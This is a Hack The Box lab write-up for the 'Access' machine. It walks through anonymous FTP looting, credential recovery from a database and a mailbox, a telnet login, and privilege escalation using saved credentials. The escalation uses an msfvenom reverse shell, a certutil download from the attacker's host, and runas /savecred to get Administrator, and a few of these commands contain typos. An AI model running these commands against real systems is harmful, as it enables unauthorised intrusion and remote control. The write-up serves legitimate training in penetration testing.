# Access [htb](https://app.hackthebox.com/machines/Access)
![Access-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/acess-01.png)


## Recon

Before we start enumeration, let's add the target to our `/etc/hosts` file:
![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/hosts-02.png)


Running nmap:

`nmap -sC -sV -p- -A access.htb -oN nmap.result`

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/nmap-res-03.png)


We have the following:

+ FTP on port 21 (appears to permit anonymous logins).
+ Telnet on port 23. 
+ An IIS v7.5 server on port 80. 


We should start with the FTP server and see if we can find interesting information, or maybe 
misconfiguration of privileges. We then should take a look at the IIS server, and finally telnet 
at the end if we get stuck. 



### FTP 21

Let's login anonymously with `anonymous : anonymous`: 

![anon-ftp-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/anon-ftp-04.png)


We have two folders: 
+ Backups
+ Engineer


Lets cd into `Backups` and see what we can find: 

![ftp-backups-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/ftp-backups-05.png)


Looks like we have an `.mdb` database here. Lets switch to binary mode and get this to our kali. 

![get-db-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/get-db-06.png)


We can open this type of database [online](https://www.mdbopener.com/): 

![open-db-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/open-db-07.png)


we get a list of all the tables in the database, and we can view them online. Iv'e found a couple
of interesting tabels. Primarly: 

+ auth_user - This is the user table with clear-text credentials. 

![auth-user-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/auth-user-08.png)

+ action_log - Stores action performed by the admin when setting up the database. 
+ USERINFO   - Inforamtion about users. 
+ auth_group - An administration group name and permissions. 

 
The `auth-user` is of most interest to us, we should try to use these credentials on the IIS 
server. But before we do that, there was another folder on the FTP, `Engineer`, 
and we have a user named engineer in the db. Lets see what we can find. 

![engineer-ftp-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/engineer-ftp-09.png)

Looks important. Lets put this on our Kali: 

![get-acl-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/get-acl-10.png)


If we examine the file with `file access_control.zip` (i renamed it): 

![file-acl-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/file-acl-11.png)


We can see it's an AES encrypted ZIP archive. You can try to use `zip2john`, then crack it with 
`john` but that wont work. we have the credentials for this archive. 

Use `7za` to decompress the arachive: 

`7za e access_control.zip`


![extract-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/extract-12.png)


This gives us a `.pst` file (personal storage table), which is a file format Microsoft programs 
use to store items like calendar events, contacts, and email messages. PST files are stored 
within popular Microsoft software like `Microsoft Exchange`, `Windows Messaging`, 
and `Microsoft Outlook`.

We can open `.pst` files on Kali using `readpst`: 

`apt install pst-utils`


Then read the file with `readpst acl.pst` (renamed the file). 

![readpst-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/readpst-13.png)


This outputs an `.mbox` file we can read on Unix with `less acl.mbox`:

![mail-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/mail-14.png)


We found another user account, this time for a uyser named "security". This user didnt show 
up in the `auth-user` table from before. Lets take a look at the web-sever. 



### IIS 80

If we open our browser and navigate towards `http://access.htb/` we get the following page:

![site-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/site-15.png)

Not much to do here, Lets try directory busting with: 

`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://access.htb/FUZZ`


Nothing comes up. The site is empty, lets try the telnet. 


### Telnet 23

If we connect to the server with `telnet access.htb`, and wait just a sec... we will be prompted
for credentials: 

![shell-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/shell-16.png)

Use the credetials we got from the email `security : `4Cc3ssC0ntr0ller`.  
Lets move to priv esc. 



## Privilege Escalation

If we list out our user privileges: 

![privs-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/privs-17.png)


Nothing interesting comes out. If we list out `systeminfo` : 

![sysinfo-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/sysinfo-18png.png)

We can see wer'e running a 2008 server V6.1.7600. We can check exploits but there is a faster way.
Lets search for stored credentials with `cmdkey /list`

![creds-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/creds-19.png)


We can now use `runas` to take the admins passwords and run a reverse shell payload.

+ First we need some venom: 

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.68 LPORT=9009 -f exe > rshell.exe`

![venom-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/venom-20.png)


+ Start a python server with:

`python3 -m htp.server 80`


+ Download the shellcode to the target with:

`ertutil -urlcache -f http://10.10.14.68/rshell.exe rshell.exe`


+ Start the listner with: 

`nc -lnvp 9009`


+ Exeecute the payload as Administrator:

`runas /savecred /user:ACCESS\Administrator "C:\\Users\security\rshell.exe"`


+ Get a shell:

![root-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Access/img/root-20.png)
